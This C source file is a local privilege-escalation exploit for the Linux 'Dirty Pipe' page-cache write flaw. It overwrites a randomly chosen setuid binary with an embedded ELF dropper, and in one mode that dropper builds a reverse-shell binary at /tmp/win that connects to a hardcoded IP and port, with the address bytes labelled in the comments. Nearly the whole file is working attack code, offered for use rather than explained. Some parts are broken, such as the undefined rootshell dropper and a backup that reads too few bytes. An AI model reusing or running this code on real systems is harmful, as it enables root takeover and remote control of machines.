#define _GNU_SOURCE
#include <assert.h>
#include <errno.h>
#include <fcntl.h>
#include <stdbool.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <time.h>
#include <unistd.h>

#define formatBool(b) ((b) ? "true" : "false")
#ifndef PAGE_SIZE
#define PAGE_SIZE 4096
#endif

static char buf[PAGE_SIZE];

void prepare_pipe(int32_t p[2]) {
  if (pipe(p))
    abort();
  uint64_t pipe_size = fcntl(p[1], F_GETPIPE_SZ);

  for (int32_t i = 0; i < pipe_size;) {
    uint64_t n = i % sizeof(buf) < sizeof(buf) ? sizeof(buf) : i;
    write(p[1], buf, n);
    i += n;
  }

  for (int32_t i = 0; i < pipe_size;) {
    uint64_t n = i % sizeof(buf) < sizeof(buf) ? sizeof(buf) : i;
    read(p[0], buf, n);
    i += n;
  }
}

u_char revshell_dropper[] = {
    0x45, 0x4c, 0x46, 0x02, 0x01, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x03, 0x00, 0x3e, 0x00, 0x01, 0x00, 0x00, 0x00, 0x78,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x40, 0x00, 0x38, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x05, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xb9,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xb9, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xb0,
    0x02, 0x48, 0x8d, 0x3d, 0x3b, 0x00, 0x00, 0x00, 0xbe, 0x41, 0x02, 0x00,
    0x00, 0x0f, 0x05, 0x48, 0x89, 0xc7, 0x48, 0x8d, 0x35, 0x33, 0x00, 0x00,
    0x00, 0xba, 0xf8, 0x00, 0x00, 0x00, 0xb0, 0x01, 0x0f, 0x05, 0x48, 0x31,
    0xc0, 0xb0, 0x03, 0x0f, 0x05, 0x48, 0x8d, 0x3d, 0x13, 0x00, 0x00, 0x00,
    0xbe, 0xfd, 0x0d, 0x00, 0x00, 0xb0, 0x5a, 0x0f, 0x05, 0x48, 0x31, 0xff,
    0xb0, 0x3c, 0x0f, 0x05, 0x00, 0x00, 0x00, 0x2f, 0x74, 0x6d, 0x70, 0x2f,
    0x77, 0x69, 0x6e, 0x00, 0x7f, 0x45, 0x4c, 0x46, 0x02, 0x01, 0x01, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x03, 0x00, 0x3e, 0x00,
    0x01, 0x00, 0x00, 0x00, 0x78, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x40, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x38, 0x00,
    0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00,
    0x05, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0xf8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0xf8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x10, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x48, 0x31, 0xff, 0xb0, 0x69, 0x0f, 0x05, 0x48,
    0x31, 0xff, 0xb0, 0x6a, 0x0f, 0x05, 0xba, 0x00, 0x00, 0x00, 0x00, 0xbe,
    0x01, 0x00, 0x00, 0x00, 0xbf, 0x02, 0x00, 0x00, 0x00, 0xb8, 0x29, 0x00,
    0x00, 0x00, 0x0f, 0x05, 0x48, 0x89, 0xc7, 0x48, 0x31, 0xc0, 0x50, 0x48,
    0xb8, 0x02, 0x00, 0x05, 0x39, 0xc0, 0xa8,       // 0x05, 0x39 is the port
    0x38, 0x01, 0x50, 0x48, 0x8d, 0x34, 0x24, 0xba, // 0xc0, 0xa8, 0x38, 0x01 is
                                                    // the IP
    0x10, 0x00, 0x00, 0x00, 0xb8, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xbe,
    0x00, 0x00, 0x00, 0x00, 0xb0, 0x21, 0x0f, 0x05, 0xbe, 0x01, 0x00, 0x00,
    0x00, 0xb0, 0x21, 0x0f, 0x05, 0xbe, 0x02, 0x00, 0x00, 0x00, 0xb0, 0x21,
    0x0f, 0x05, 0x48, 0xbb, 0xd1, 0x9d, 0x96, 0x91, 0xd0, 0x8c, 0x97, 0xff,
    0x48, 0xf7, 0xdb, 0x53, 0x48, 0x89, 0xe7, 0xba, 0x00, 0x00, 0x00, 0x00,
    0xbe, 0x00, 0x00, 0x00, 0x00, 0xb0, 0x3b, 0x0f, 0x05};

u_char rootshell_dropper[];

int32_t dirty_pipe(char *path, loff_t offset, uint8_t *data,
                   int64_t data_size) {
  if (offset % PAGE_SIZE == 0) {
    fprintf(stderr, "\t[ERR] Sorry, cannot start writing at a page boundary\n");
    return EXIT_FAILURE;
  }

  loff_t next_page = (offset | (PAGE_SIZE - 1)) + 1;
  loff_t end_offset = offset + (loff_t)data_size;
  if (end_offset > next_page) {
    fprintf(stderr, "\t[ERR] Sorry, cannot write across a page boundary\n");
    return EXIT_FAILURE;
  }
  /* open the input file and validate the specified offset */
  int64_t fd = open(path, O_RDONLY); // yes, read-only! :-)
  if (fd < 0) {
    perror("\t[ERR] open failed");
    return EXIT_FAILURE;
  }

  struct stat st;
  if (fstat(fd, &st)) {
    perror("\t[ERR] stat failed");
    return EXIT_FAILURE;
  }

  if (offset > st.st_size) {
    fprintf(stderr, "\t[ERR] Offset is not inside the file\n");
    return EXIT_FAILURE;
  }

  if (end_offset > st.st_size) {
    fprintf(stderr, "\t[ERR] Sorry, cannot enlarge the file\n");
    return EXIT_FAILURE;
  }

  /* create the pipe with all flags initialized with
     PIPE_BUF_FLAG_CAN_MERGE */
  int32_t p[2];
  prepare_pipe(p);

  /* splice one byte from before the specified offset into the
     pipe; this will add a reference of our data to the page cache, but
     since copy_page_to_iter_pipe() does not initialize the
     "flags", PIPE_BUF_FLAG_CAN_MERGE is still set */
  --offset;
  int64_t nbytes = splice(fd, &offset, p[1], NULL, 1, 0);
  if (nbytes < 0) {
    perror("\t[ERR] splice failed");
    return EXIT_FAILURE;
  }
  if (nbytes == 0) {
    fprintf(stderr, "\t[ERR] short splice\n");
    return EXIT_FAILURE;
  }

  /* the following write will not create a new pipe_buffer, but
     will instead write into the page cache, because of the
     PIPE_BUF_FLAG_CAN_MERGE flag */
  nbytes = write(p[1], data, data_size);
  if (nbytes < 0) {
    perror("\t [ERR] write failed");
    return EXIT_FAILURE;
  }
  if ((int64_t)nbytes < data_size) {
    fprintf(stderr, "\t[ERR] short write\n");
    return EXIT_FAILURE;
  }

  printf("\t[DBG] It worked!\n");
  return EXIT_SUCCESS;
}

char *find_random_setuid_binary() {
  FILE *fp;
  char max_output[256];
  char *tmp[1024];
  uint32_t i = 0;

  // Find SUID binaries that are also executable for others :)
  fp = popen("find / -perm -u=s -perm -o=x -type f 2>/dev/null", "r");
  if (fp == NULL) {
    puts("[ERR] Failed to scan for SETUID binaries :(");
    exit(EXIT_FAILURE);
  }
  while (fgets(max_output, sizeof(max_output), fp) != NULL) {
    max_output[strcspn(max_output, "\r\n")] = 0;
    tmp[i] = malloc(strlen(max_output + 1));
    strcpy(tmp[i], max_output);
    i++;
  }
  pclose(fp);

  time_t t;
  srand((unsigned int)time(NULL));
  uint32_t idx = rand() % i;

  return tmp[idx] != NULL ? tmp[idx] : NULL;
}

int32_t help(char **argv) {
  fprintf(stderr, "Usage: %s MODE [TARGETFILE OFFSET DATA]\n", argv[0]);
  fprintf(stderr, "MODE:\n");
  fprintf(stderr, "\t1 - local root shell\n");
  fprintf(stderr, "\t2 - reverse root shell\n");
  fprintf(stderr, "\t3 - custom (s.below)\n");
  fprintf(stderr,
          "IFF MODE == 3 you can provide a TARGETFILE, OFFSET, and DATA\n");
  return EXIT_FAILURE;
}

uint8_t *backup_original(char *suid_bin, loff_t offset, int64_t dropper_sz) {
  uint64_t fd = open(suid_bin, O_RDONLY); // 0_RDONLY because that's fun
  uint8_t *bk = malloc(dropper_sz);
  if (bk == NULL) {
    return bk;
  }
  lseek(fd, offset, SEEK_SET);
  read(fd, bk, sizeof(dropper_sz));
  close(fd);
  return bk;
}

int32_t restore_original(char *suid_bin, loff_t offset, uint8_t *original_suid,
                         int64_t dropper_sz) {
  puts("[DBG] Unwinding SUID binary to its original state...");
  if (dirty_pipe((char *)suid_bin, offset, original_suid, dropper_sz) != 0) {
    puts("[ERR] Catastrophic failure :(");
    return EXIT_FAILURE;
  }
  return 0;
}

int32_t main(int argc, char **argv) {
  if (argc == 1) {
    return help(argv);
  }

  if (argc == 2) {
    if (strncmp(argv[1], "1", 1) == 0 || strncmp(argv[1], "2", 1) == 0) {
      char *suid_bin = find_random_setuid_binary();
      if (!suid_bin) {
        puts("[ERR] Could not find a suitable SUID binary...\n");
        return EXIT_FAILURE;
      }

      uint8_t *data = (strncmp(argv[1], "1", 1) == 0) ? rootshell_dropper
                                                      : revshell_dropper;
      int64_t dsize = (strncmp(argv[1], "1", 1) == 0)
                          ? sizeof(rootshell_dropper)
                          : sizeof(revshell_dropper);
      loff_t offset = 1;
      uint8_t *original_suid = backup_original(suid_bin, offset, dsize);

      printf("[DBG] Using SUID binary %s to inject dropper!\n", suid_bin);
      if (dirty_pipe((char *)suid_bin, offset, data, dsize) != 0) {
        puts("[ERR] Catastrophic failure :(");
        return EXIT_FAILURE;
      }

      puts("[DBG] Executing dropper");
      int32_t ret = system(suid_bin);

      int32_t ro = restore_original(suid_bin, offset, original_suid, dsize);
      if (ro != 0) {
        return ro;
      }

      if (ret != 0) {
        puts("[ERR] Failed tp execute dropper... Try again. No harm done :)\n");
        return EXIT_FAILURE;
      }

      puts("[DBG] Executing win condition!");
      system("/tmp/win");
    } else {
      return help(argv);
    }
  } else {
    // Original PoC by Max K.
    // [...]
  }
}
